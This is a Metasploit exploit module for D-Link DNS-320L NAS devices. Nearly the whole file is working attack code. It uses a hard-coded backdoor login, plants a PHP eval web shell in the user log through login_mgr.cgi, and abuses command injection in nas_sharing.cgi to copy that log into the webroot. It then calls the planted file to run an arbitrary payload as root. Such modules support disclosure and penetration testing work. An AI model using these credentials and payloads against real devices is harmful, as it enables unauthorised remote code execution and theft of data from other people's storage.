##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      'Name'           => "D-Link DNS-320L 'mydlinkBRionyg' Backdoor",
      'Description'    => %q{
        This module exploits two issues. The first issue is that there is a hard 
        coded backdoor within DNS-320L devices. Using this backdoor access we 
        can then reach buggy code which is vulnerable to command injection. Root 
        shell will be spawned upon successful exploitation. Firmare versions 1.0 
        (2012/6/15) to 6.0 (2015/07/28) are vulnerable.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'James Bercegay', # Vulnerability Discovery
        ],
      'References'     =>
        [
          [ 'URL', 'https://gulftech.org/' ]
        ],
      'Privileged'     => false,
      'Payload'        =>
        {
          'DisableNops' => true
        },
      'Platform'       => ['php'],
      'Arch'           => ARCH_PHP,
      'Targets'        => [ ['Automatic', {}] ],
      'DisclosureDate' => '2018-01-03',
      'DefaultTarget'  => 0))
  end

  def check
      
      # We check for the presence of this vulnerability by requesting a default 
      # system file and checking if the response code is 302.
      res = send_request_cgi({
        'method'   => 'POST',
        'uri'      => "/cgi-bin/nas_sharing.cgi",
        'vars_post' => {
          'cmd' => 7,
          'user' => "mydlinkBRionyg",
          'passwd' => Rex::Text.encode_base64("abc12345cba"),
          'path' => Rex::Text.encode_base64("/mnt/HD/HD_a2/.!@$mmc")
        }
      })

    if res and res.code == 302
      return Exploit::CheckCode::Vulnerable
    else
      return Exploit::CheckCode::Safe
    end
  end

  def exploit

    # Make things a bit less obvious?
    rnd = Rex::Text.rand_text_hex(rand(10) + 5)
    idx = rand(1000)

    # We know the system supports PHP, so we go with a PHP payload
    print_status("Injecting selected payload into user logs")

      res = send_request_cgi({
        'method'   => 'POST',
        'uri'      => "/cgi-bin/login_mgr.cgi",
        'vars_post' => {
          'cmd' => 'logout',
          'name' => "<?php unlink(__FILE__);eval(base64_decode($_REQUEST[#{idx}]));?>"
        }
      })

    # We are not allowed to use spaces or $IFS etc.
    print_status("Copying payload from syslog to webroot")

      res = send_request_cgi({
        'method'   => 'POST',
        'uri'      => "/cgi-bin/nas_sharing.cgi",
        'vars_post' => {
          'cmd' => 15,
          'user' => "mydlinkBRionyg",
          'passwd' => Rex::Text.encode_base64("abc12345cba"),
          'system' => Rex::Text.encode_base64("cat</var/log/user.log>/var/www/#{rnd}.php")
        }
      })

    # Execute the selected payload
    print_status("Now attempting to execute the selected payload")

      res = send_request_cgi({
        'method'   => 'POST',
        'uri'      => "/#{rnd}.php",
        'vars_post' => {
          idx => Rex::Text.encode_base64("#{payload.encoded};")
        }
      })
          
    end
end